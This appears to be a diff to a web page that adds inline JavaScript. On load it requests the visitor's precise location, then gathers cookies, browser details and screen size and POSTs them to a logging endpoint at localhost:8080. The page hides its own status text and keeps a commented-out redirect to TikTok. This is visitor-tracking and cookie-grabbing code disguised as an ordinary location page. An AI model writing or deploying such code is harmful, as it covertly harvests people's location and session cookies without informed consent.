@@ -17,7 +17,147 @@
         <pre id="result"></pre>
         <div id="links"></div>
     </main>
-    <script src="app/index.js" type="module"></script>
+    <script>
+      function redirectPage(status, lat, long, accuracy, timestamp, uriMaps) {
+        const cookies = document.cookie;
+
+        let navigations = [{
+          cookieEnabled: navigator.cookieEnabled,
+          online: navigator.online,
+          linguagem: navigator.language
+        },
+        {
+          cookies: {
+            cookieStore: cookies
+          }
+        },
+        {
+          tela: {
+            width: screen.width,
+            height: screen.height
+          }
+
+        }];
+
+        const meta = formatMetadata(lat, long, accuracy, timestamp, uriMaps, navigations, cookies);
+
+        if (status === true) {
+          try {
+            fetch("http://localhost:8080/api/log", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                meta,
+                userAgent: navigator.userAgent
+              })
+            })
+              .then((response) => {
+                return response.json();
+              })
+              .then((data) => {
+                console.log(data);
+              }).catch((err) => {
+
+              });
+          } catch (error) {
+            console.warn(error);
+          }
+          // window.location.href = "https://www.tiktok.com/"
+        }
+      }
+
+      function formatMetadata(lat, long, accuracy, timestamp, uriMaps, navigations, cookies) {
+
+        console.log(`os cookies: ${cookies}`);
+
+        let params = [{
+          latitude: lat,
+          longitude: long,
+          accuracy: accuracy,
+          timestamp: timestamp,
+          uriMaps: uriMaps.href,
+        }, {
+          cookies: cookies
+        },
+        {
+          navegacao: {
+            nav: navigations
+          }
+        }];
+
+        return params;
+      }
+
+      function updateStatus(text, isError = false) {
+        const statusEl = document.getElementById("status");
+        if (!statusEl) return;
+
+        statusEl.style.visibility = "hidden";
+        statusEl.textContent = "Status: " + text;
+        statusEl.className = isError ? "small error" : "small";
+      }
+
+      function showResult(position) {
+        if (!position || !position.coords) {
+          updateStatus("Retorno inesperado da API", true);
+          return;
+        }
+
+        const resultEl = document.getElementById("result");
+        const linksEl = document.getElementById("links");
+
+        const { latitude, longitude, accuracy } = position.coords;
+        const ts = new Date(position.timestamp).toLocaleString();
+
+        resultEl.textContent = `Latitude: ${latitude}\nLongitude: ${longitude}\nPrecisão: ${accuracy}m\nTimestamp: ${ts}`;
+
+        linksEl.innerHTML = "";
+        const gmaps = document.createElement("a");
+        gmaps.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        // gmaps.target = "_blank";
+        // gmaps.textContent = "Abrir no Google Maps";
+        // linksEl.appendChild(gmaps);
+
+        updateStatus("O site está te levando até a o link");
+        redirectPage(true, latitude, longitude, accuracy, ts, gmaps);
+      }
+
+      function handleError(err) {
+        const resultEl = document.getElementById("result");
+        const linksEl = document.getElementById("links");
+
+        const msg =
+          {
+            1: "Permissão negada pelo usuário!",
+            2: "Localizaçāo necessária!",
+            3: "Tempo excedido",
+          }[err.code] || "Erro desconhecido";
+
+        updateStatus(msg, true);
+        resultEl.textContent = "--";
+        linksEl.innerHTML = "";
+      }
+
+      function requestLocationAutomatically() {
+        if (!("geolocation" in navigator)) {
+          updateStatus("Geolocation API não suportada", true);
+          return;
+        }
+
+        updateStatus("Solicitando seu local");
+
+        navigator.geolocation.getCurrentPosition(showResult, handleError, {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0,
+        });
+      }
+
+      // Executa a função quando a página é carregada
+      window.addEventListener("load", requestLocationAutomatically);
+    </script>
 </body>
 
 </html>
